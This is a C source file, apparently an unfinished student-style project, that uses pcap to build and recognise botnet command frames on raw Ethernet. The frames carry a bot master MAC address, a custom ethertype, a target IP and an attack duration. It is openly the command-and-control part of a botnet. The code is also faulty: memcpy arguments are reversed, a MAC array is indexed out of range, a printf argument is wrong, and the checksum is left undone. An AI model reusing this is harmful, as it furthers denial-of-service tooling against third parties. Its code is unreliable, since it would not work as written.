#include "utils.h"
#include <string.h>
#include <stdlib.h>



_Bool is_adapter_availiable(const char* adapter)
{
    pcap_if_t* node = NULL;

    char code = pcap_findalldevs(&node, errbuff);

    if(code)
    {
        NPCAP_ERROR
        return false;
    }

        
    pcap_if_t* ptr = node;
    while(ptr)
    {
        if(!strcmp(ptr->name, adapter))
        {
            pcap_freealldevs(node);
            return true;
        }  
        
        ptr = ptr->next;
    }

    pcap_freealldevs(node);
    return false;
}

void print_availiable()
{
    pcap_if_t* node = NULL;

    char code = pcap_findalldevs(&node, errbuff);

    if(code)
    {
        NPCAP_ERROR
        return;
    }

    printf("Devices availiable:\n");

    pcap_if_t* ptr = node;
    while(ptr)
    {
        printf("%s (%s)\n", ptr->name, ptr->description ? ptr->description : "no_description");
        
        ptr = ptr->next;
    }

    pcap_freealldevs(node);
}

void extract_attack_info(const u_char *package, u_char *target_ip, u_char *attack_time)
{
    memcpy(package+14, target_ip, 4);
    memcpy(package+18, attack_time, 4);
}

_Bool is_bot_command(const u_char *package)
{
    _Bool result = true;
    for(int i=0; i<6; i++)
        result &= package[i] == broadcast_mac[i];
    
    for(int i=6; i<12; i++)
        result &= package[i] == bot_master_mac[i];
    
    return result && package[12] == *((u_char*)(&bot_ethertype) + 1) && package[13] == *((u_char*)(&bot_ethertype) + 0);
}

void handle_packets(u_char* user, const struct pcap_pkthdr *h, const u_char *bytes)
{
    printf("Packet arrived at %ld with data:\n", h->ts.tv_sec);
    for(int i=0; i<h->caplen; i++)
        printf("%x ", bytes[i]);
    printf("\n\n");

    if(is_bot_command(bytes))
    {
        u_char target_ip[4];
        u_char attack_time[4];
        extract_attack_info(bytes, target_ip, attack_time);
        
        printf("commanded to attack ip: ");
        for(int i=0; i<3; i++)
            printf("%d.", target_ip[i]);
        printf("%d ", target_ip[3]);

        int sec = 0;
        for(int i=0; i<4; i++)
            *((u_char*)(&sec) + i) = attack_time[i];
        printf("for %d seconds\n", attack_time);
    }
}

void create_bot_command(const u_char ip[4], int attack_time, u_char* package)
{
    // broadcast destination
    for(int i=0; i<6; i++)
        package[i] = broadcast_mac[i];
    
    //source address
    for(int i=6; i<12; i++)
    {
        package[i] = bot_master_mac[i-6];
    }

    //ethertype
    package[12] = *((u_char*)(&bot_ethertype) + 1);
    package[13] = *((u_char*)(&bot_ethertype) + 0);
    
    //target ip
    memcpy(package + 14, ip, 4);
    
    //attack time
    for(int i=0; i<4; i++)
        package[18+i] = *((u_char*)(&attack_time) + 3-i);
    
    //padding
    for(int i=22; i<63; i++)
        package[i] = 0;
    
    // FCS calculation
    // todo

}
